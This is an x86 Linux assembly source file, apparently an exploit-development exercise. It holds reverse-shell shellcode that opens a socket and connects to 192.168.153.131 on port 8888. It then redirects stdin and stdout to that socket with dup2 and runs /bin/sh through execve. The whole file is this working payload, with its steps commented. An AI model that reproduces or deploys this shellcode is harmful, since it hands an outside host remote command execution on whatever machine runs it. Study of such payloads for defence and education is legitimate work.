;Author:   evoche
;License:  GPL

global _start
section .text
	
;use this as the program entry point
_start:

	;zero registers
	xor eax,eax
	xor ebx,ebx
	xor ecx,ecx
	xor edx,edx
	xor esi,esi
	
	;eax -> sys_socketcall
	;ebx -> socket function
	;exc -> arguments
	
	;***Socket***
	;int srvSoc = socket(AF_INET, SOCK_STREAM, 0);
	mov al, 0x66			;102 is socketcall number
	inc ebx					;socket system call = 1
	push esi				;3rd arg - protocol - 0
	push 0x1				;2nd arg - socket_type - SOCK_STREAM
	push 0x2				;1st arg - socket_family - AF_INET     
	mov ecx,esp             ;load the arguments pointer into ecx
	int 0x80                ;execute
	mov edx,eax             ;transfer srvSoc fd to edx

	;***Connect***
	;connect(clifd, (struct sockaddr *)&srvFd, 16);	
	mov al, 0x66			;102 is socketcall number
	inc ebx					;connect system call = 3
	inc ebx
							;start to build the struc
	push DWORD 0x8399A8C0	;srvFd.sin_addr.s_addr = inet_addr("192.168.153.131");	//accepts connections to all the IPs of the machine
	push word 0xB822		;srvFd.sin_port = htons(8888);							//port number
	push word 0x2;			;srvFd.sin_family = AF_INET;							//family for IP address
	mov ecx,esp				;save address of struct
	push 0x10				;3rd arg - size of struct = 16
	push ecx				;2nd arg - pointer to sockaddr struct
	push edx				;1st arg - socket fd
	mov ecx,esp             ;load the arguments pointer into ecx
	int 0x80                ;execute

	;***Dup2***
	;dup2(clifd, 0);
	mov al, 0x3F			;63 dup2 system call number
	mov ebx, edx			;client fd
	mov ecx, esi 			;stdin redirect
	int 0x80				;execute	

	;***Dup2***
	;dup2(clifd, 1);
	mov al, 0x3F			;63 dup2 system call number
	mov ebx, edx			;client fd
	inc ecx					;stdout redirect
	int 0x80				;execute	

	;***Execve*** - got directly from notes
	xor eax, eax
	push eax
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp
	push eax
	mov edx, esp
	push ebx
	mov ecx, esp
	mov al, 11
	int 0x80
	



